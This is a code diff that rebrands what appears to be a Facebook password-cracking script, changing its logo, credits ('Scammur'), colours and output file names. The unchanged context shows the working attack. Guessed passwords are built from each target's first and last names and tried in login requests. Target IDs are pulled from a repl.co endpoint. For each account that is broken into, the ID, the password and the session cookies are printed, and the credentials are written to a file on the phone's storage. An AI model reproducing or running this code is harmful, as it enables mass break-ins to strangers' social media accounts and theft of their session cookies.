@@ -39,28 +39,32 @@ def bypass():
   else:
     main()
 #----------logo----------#
-logo=('''\033[1;36m 
-█▀ █░█ █ █▄▀ █   █▀▄▀█ ▄▀█ █▀▀ █░█ █ █▄░█ ▄▀█
-▄█ █▀█ █ █░█ █   █░▀░█ █▀█ █▄▄ █▀█ █ █░▀█ █▀█
+logo=('''\033[1;33m 
+██████╗░██████╗░░░██╗██╗██╗░░██╗
+██╔══██╗██╔══██╗░██╔╝██║╚██╗██╔╝
+██║░░██║██████╔╝██╔╝░██║░╚███╔╝░
+██║░░██║██╔══██╗███████║░██╔██╗░
+██████╔╝██║░░██║╚════██║██╔╝╚██╗
+╚═════╝░╚═╝░░╚═╝░░░░░╚═╝╚═╝░░╚═╝
       ''')
 #----------clear----------#
 xy = requests.get('https://api.ipify.org/').text
 os.system('clear')
-print('\r\r\r\33[1;36m              YOUR IP:\33[1;36m'+str(xy))
+print('\r\r\r\33[1;33m              YOUR IP:\33[1;36m'+str(xy))
 time.sleep(5)
 def clear():
     os.system('clear')
     print(logo)
     print(42*'═')
-    print(' \033[1;33mFB       : Machina Shiki')
-    print(' REPLIT  : Hayih59124')
-    print(' STATUS  : Private')
-    print(' VERSION : 1.0')
+    print(' \033[1;33mFB LINK : https://www.facebook.com/angbo.bomo.75 ')
+    print(' GITHUB  : Scammur')
+    print(' STATUS  : FREE')
+    print(' VERSION : 2.3')
     print(' IP      : '+xy)
-    print(42*'\033[1;36m═\033[0m')
+    print(42*'\033[1;32m═\033[0m')
 #----------line----------#
 def line():
-    print(42*'\033[1;36m═')
+    print(42*'\033[1;32m═')
 #----------menu----------#
 def gffs(ids):
     get_ffs = requests.get("https://jahsbsbs--andrewvista2005.repl.co/ffs.php?chat="+str(ids)).json()
@@ -138,7 +142,7 @@ def m1(ids,names,passlist):
         except:
             ln=fn
         for pw in passlist:
-            sys.stdout.write('\r\r\033[1;36m [eut~ M1] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
+            sys.stdout.write('\r\r\033[1;36m [PABLO ~ M1] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
             pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
             data={
               'adid': f'{uuid.uuid4()}', 
@@ -191,7 +195,7 @@ def m1(ids,names,passlist):
                 print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                 print('\r\r \033[1;33m[FB-LINK]\033[1;34m https://www.facebook.com/'+ids)
                 print('\033[1;32m [COOKIES] \033[1;36m'+coki)
-                open('/sdcard/Shiki-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
+                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in req['error']['message']:
@@ -212,7 +216,7 @@ def m2(ids,names,passlist):
         except:
             ln=fn
         for pw in passlist:
-            sys.stdout.write('\r\r\033[1;36m [Shiki~ M2] %s| \033[1;32mOk\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
+            sys.stdout.write('\r\r\033[1;36m [PABLO ~ M2] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
             pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
             data={
               'adid': f'{uuid.uuid4()}', 
@@ -266,7 +270,7 @@ def m2(ids,names,passlist):
                 print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                 print('\r\r \033[1;33m[FB-LINK] \033[1;34mhttps://www.facebook.com/'+ids)
                 print('\033[1;32m [COOKIES] \033[1;36m'+coki)
-                open('/sdcard/Shiki-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
+                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in req['error']['message']:
